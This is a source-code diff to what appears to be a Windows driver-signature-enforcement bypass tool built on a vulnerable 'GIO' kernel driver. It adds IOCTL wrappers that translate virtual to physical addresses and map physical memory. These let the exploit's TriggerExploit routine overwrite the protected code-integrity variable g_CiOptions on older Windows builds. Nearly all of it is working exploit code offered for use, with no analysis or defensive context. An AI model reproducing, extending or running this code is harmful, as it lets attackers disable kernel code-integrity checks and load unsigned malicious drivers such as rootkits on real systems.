@@ -11,6 +11,8 @@
 #define GIO_DEVICE_NAME				L"\\Device\\GIO"
 #define FILE_DEVICE_GIO				(0xc350)
 #define IOCTL_GIO_MEMCPY			CTL_CODE(FILE_DEVICE_GIO, 0xa02, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_GIO_GETPHYS			CTL_CODE(FILE_DEVICE_GIO, 0xa03, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_GIO_MAPPHYS			CTL_CODE(FILE_DEVICE_GIO, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 // Input struct for IOCTL_GIO_MEMCPY
 typedef struct _GIOMemcpyInput
@@ -19,6 +21,18 @@ typedef struct _GIOMemcpyInput
 	ULONG_PTR Src;
 	ULONG Size;
 } GIOMemcpyInput, *PGIOMemcpyInput;
+
+// Input struct for IOCTL_GIO_MAPPHYS
+#pragma pack (push, 1)
+typedef struct _GIO_MAPPHYS
+{
+	DWORD InterfaceType;
+	DWORD Bus;
+	PVOID PhysicalAddress;
+	DWORD IoSpace;
+	DWORD Size;
+} GIO_MAPPHYS, *PGIO_MAPPHYS;
+#pragma pack (pop)
 
 static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];
 
@@ -241,6 +255,85 @@ Exit:
 	return Status;
 }
 
+static
+PVOID
+GetPhysForVirtual(_In_ HANDLE DeviceHandle, _In_ PVOID VirtualAddress)
+{
+	NTSTATUS Status;
+	IO_STATUS_BLOCK IoStatusBlock;
+
+	PVOID Address = VirtualAddress;
+
+	Status = NtDeviceIoControlFile(DeviceHandle,
+		nullptr,
+		nullptr,
+		nullptr,
+		&IoStatusBlock,
+		IOCTL_GIO_GETPHYS,
+		&Address,
+		sizeof(Address),
+		&Address,
+		sizeof(Address));
+	if (!NT_SUCCESS(Status))
+	{
+		Printf(L"NtDeviceIoControlFile(IOCTL_GIO_GETPHYS) failed: error %08X\n", Status);
+		return NULL;
+	}
+
+	return (PVOID)((reinterpret_cast<LARGE_INTEGER*>(&Address))->LowPart);
+}
+
+static
+PVOID
+MapPhysicalForVirtual(_In_ HANDLE DeviceHandle, _In_ PVOID PhysicalAddress, _In_ DWORD Size)
+{
+	NTSTATUS Status;
+	IO_STATUS_BLOCK IoStatusBlock;
+
+	GIO_MAPPHYS in = { 0 };
+	RtlZeroMemory(&in, sizeof(in));
+	in.InterfaceType = 0;
+	in.Bus = 0;
+	in.PhysicalAddress = PhysicalAddress;
+	in.IoSpace = 0;
+	in.Size = Size;
+
+	Status = NtDeviceIoControlFile(DeviceHandle,
+		nullptr,
+		nullptr,
+		nullptr,
+		&IoStatusBlock,
+		IOCTL_GIO_MAPPHYS,
+		&in,
+		sizeof(in),
+		&in,
+		sizeof(in));
+	if (!NT_SUCCESS(Status))
+	{
+		Printf(L"NtDeviceIoControlFile(IOCTL_GIO_MAPPHYS) failed: error %08X\n", Status);
+		return NULL;
+	}
+
+	return *reinterpret_cast<PVOID*>(&in);
+}
+
+static
+NTSTATUS
+MitigateCiProtectedContent(_In_ HANDLE DeviceHandle, _In_ PVOID* Address)
+{
+	PVOID PhysicalAddress = GetPhysForVirtual(DeviceHandle, *Address);
+	if (!PhysicalAddress)
+		return STATUS_INVALID_ADDRESS;
+
+	PVOID MappedVirtualAddress = MapPhysicalForVirtual(DeviceHandle, PhysicalAddress, sizeof(DWORD));
+	if (!MappedVirtualAddress)
+		return STATUS_INSUFFICIENT_RESOURCES;
+
+	*Address = MappedVirtualAddress;
+
+	return STATUS_SUCCESS;
+}
+
 static int ConvertToNtPath(PWCHAR Dst, PWCHAR Src) // TODO: holy shit this is fucking horrible
 {
 	wcscpy_s(Dst, sizeof(L"\\??\\") / sizeof(WCHAR), L"\\??\\");
@@ -418,6 +511,18 @@ TriggerExploit(
 
 		// Use the out parameter to return the previous value of g_CiOptions
 		*OldCiOptionsValue = OldCiOptions;
+	}
+
+	if (NtCurrentPeb()->OSBuildNumber < 18363)
+	{
+		Printf(L"[Build:%d] g_CiProtectedContent mitigation enabled\n", NtCurrentPeb()->OSBuildNumber);
+
+		Status = MitigateCiProtectedContent(DeviceHandle, &CiVariableAddress);
+		if (!NT_SUCCESS(Status))
+		{
+			Printf(L"MitigateCiProtectedContent failed: error %08X\n", Status);
+			goto Exit;
+		}
 	}
 
 	// Set up memcpy input a second time, this time for writing
